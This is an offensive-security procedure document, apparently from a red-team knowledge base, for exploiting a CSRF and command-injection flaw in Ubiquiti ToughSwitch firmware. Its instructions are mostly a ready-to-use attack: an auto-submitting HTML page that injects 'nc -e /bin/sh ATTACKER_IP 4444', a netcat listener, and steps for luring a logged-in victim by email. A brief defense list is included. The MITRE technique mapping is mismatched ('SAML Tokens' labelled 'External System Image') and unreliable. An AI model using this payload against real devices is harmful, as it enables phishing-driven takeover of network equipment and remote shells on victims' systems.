---
id: proc-ubiquiti-toughswitch-csrf-injection
tags:
  - csrf
  - rce
  - command-injection
  - ubiquiti
  - toughswitch
type: procedure
tools: []
tactics:
  - '[[Execution]]'
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
  - Embedded Device
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Command-Line Interface]]'
  - '[[SAML Tokens]]'
updated_at: '2025-12-14T17:23:24.491Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Command-Line Interface]]'
  - '[[SAML Tokens]]'
---
# Trigger-CSRF-OS-Command-Injection-in-ToughSwitch

## Summary

This procedure exploits the combined CSRF and OS Command Injection vulnerabilities in Ubiquiti ToughSwitch v1.3.5 and prior by crafting a malicious HTML page that, when visited by an authenticated user, submits a forged request to the web interface's diagnostic endpoint, injecting arbitrary OS commands for remote code execution.

## Description

The ToughSwitch web interface lacks CSRF protections, allowing external sites to trigger state-changing requests using the victim's session. Additionally, inputs to features like ping diagnostics do not validate for command injection, enabling attackers to append shell metacharacters (e.g., ';') to execute additional commands. This leads to authenticated RCE on the embedded Linux-based device. The attack requires no direct access to the device, relying on social engineering to get a victim to visit the attacker's page while logged in. Reported by maxpl0it on HackerOne in 2017, it was resolved with a high-severity fix and bounty.

## Requirements

1. Access to host a malicious HTML page (e.g., public web server)
2. Knowledge of the target's ToughSwitch IP address and admin login (victim must be authenticated)
3. Listener setup for reverse shell (e.g., netcat on attacker machine)
4. Victim with active session in the ToughSwitch web interface

## Defense

Defensive measures and detection strategies:

- Implement CSRF tokens on all state-changing endpoints
- Validate and sanitize all user inputs to prevent command injection (e.g., whitelist allowed characters)
- Use Content Security Policy (CSP) to restrict form submissions
- Monitor web logs for anomalous requests from external referers
- Educate users on phishing and not visiting untrusted links while authenticated

## Objectives

1. Forge a cross-site request to inject OS commands without user awareness
2. Achieve remote code execution on the ToughSwitch device
3. Establish persistent access via reverse shell

## Instructions

### Step 1: Identify Vulnerable Endpoint

**Context**: Determine the exact endpoint vulnerable to command injection, typically a diagnostic tool like ping in /diag.cgi or similar.

Inspect the ToughSwitch web interface for forms that accept IP addresses or commands without validation.

**Expected Output**: Confirmation of endpoint (e.g., POST to /diag.cgi with 'ip' parameter).

### Step 2: Craft Malicious HTML Form

**Context**: Create an auto-submitting form that targets the vulnerable endpoint and injects a command, such as a reverse shell.

Use a text editor to build the HTML:

```html
<!DOCTYPE html>
<html>
<head><title>CSRF Exploit</title></head>
<body onload="document.getElementById('exploit').submit();">
    <form id="exploit" action="http://TARGET_TOUGHSWITCH_IP/diag.cgi" method="POST">
        <input type="hidden" name="ip" value="127.0.0.1; nc -e /bin/sh ATTACKER_IP 4444 #" />
        <input type="hidden" name="action" value="ping" />
    </form>
    <p>Page loading...</p>
</body>
</html>
```

Replace TARGET_TOUGHSWITCH_IP with the device's IP and ATTACKER_IP with your listener IP.

Host the file on a server (e.g., python -m http.server 80).

**Expected Output**: Page ready to serve; form submits on load.

### Step 3: Set Up Listener and Lure Victim

**Context**: Prepare to receive the shell and deliver the payload to the victim.

Start a netcat listener:

```bash
nc -lvnp 4444
```

Send the malicious URL to the victim via email or link, ensuring they are authenticated to ToughSwitch.

**Expected Output**: Upon visit, request sent; shell connects to listener.

### Step 4: Verify and Execute Commands

**Context**: Confirm RCE by running basic commands on the connected shell.

In the netcat session, execute:

```bash
id
uname -a
```

**Expected Output**: Output showing device user (e.g., root) and kernel details.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution
- [[Initial Access]] Initial Access

### Techniques

- [[Command-Line Interface]] Command and Scripting Interpreter
- [[SAML Tokens]] External System Image

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- csrf
- rce
- command-injection
- web-exploit
- embedded
